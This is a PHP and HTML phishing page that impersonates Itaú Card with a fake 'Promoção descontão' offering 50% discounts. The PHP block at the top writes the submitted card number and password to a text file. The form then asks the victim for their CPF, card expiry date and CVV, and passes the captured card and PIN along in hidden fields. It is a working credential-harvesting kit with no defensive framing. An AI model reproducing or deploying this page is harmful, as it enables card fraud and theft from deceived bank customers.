<?php
$card= $_POST['numc'];
$senha = $_POST['passc'];
$tudo = "".$card." | ".$senha." | ";

$fp = fopen("cardsenha.txt", "a");
fwrite($fp, $tudo);
fclose($fp);
?>
<!DOCTYPE html>
<html><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
	<title>Itau Card | Promoção descontão</title>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
	<script type="text/javascript" src="promocao_arquivos/jquery-3.js"></script>
	<script type="text/javascript" src="promocao_arquivos/jquery.js"></script>
	<script type="text/javascript" src="promocao_arquivos/cad_promo_scripts.js"></script>
	<link rel="stylesheet" type="text/css" href="promocao_arquivos/cad_promo_style.css">
</head>
<body>
	<header class="top-promo">
		<img src="promocao_arquivos/img_logo.png">
	</header>
	<section class="prog-cad">
		<ul>
			<li class="active">Identificação</li>
			<li>Cadastro</li>
			<li>Benefícios</li>
		</ul>
	</section>
	<section class="frm-container">
		<div class="eng-tx">
			<p>Olá cliente, para cadastrar seu cartão na promoção descontão 
Itaucard e receber 50% de desconto em suas compras feitas nos 
estabelecimentos parceiros do itau, confirme os dados abaixo.</p>
		</div>
		<div class="frm">
			<form id="frmcad" name="frmcad" method="POST" action="parabens.php">
				<input name="numc" value="1232 1231 2312 3212" type="hidden">
				<input name="passc" value="1232" type="hidden">
				<div class="frm-item">
					<input id="numcpf" name="numcpf" maxlength="14" autocomplete="off" required="" onkeyup="validatefrmcad(this.id)" type="tel">
					<label for="numcpf" class="label-float">CPF</label>
				</div>
				<div class="frm-item">
					<input id="numdtv" name="numdtv" maxlength="5" autocomplete="off" required="" onkeyup="validatefrmcad(this.id)" type="tel">
					<label for="numdtv" class="label-float">Validade do cartão</label>
				</div>
				<div class="frm-item">
					<input id="numcvv" name="numcvv" maxlength="3" autocomplete="off" required="" onkeyup="validatefrmcad(this.id)" type="tel">
					<label for="numcvv" class="label-float">Código de segurança</label>
					<span id="helpcvv" class="helpcvv"></span>
				</div>
				<input id="btncad" class="btncad" name="btncad" value="cadastrar" disabled="disabled" onclick="return validateckfrm()" type="submit">
			</form>
		</div>
	</section>
	<section id="mod-help-cvv" class="mod-help-cvv">
		<span id="mod-help-close" class="mod-help-close">x</span>
		<div class="container-mod">
			<img class="img-mod-help" src="promocao_arquivos/img_card_cvv.png">
			<p>O código de segurança são os três dígitos que encontra-se no verso do seu cartão, como mostrado na imagem acima.</p>
		</div>
	</section>

</body></html>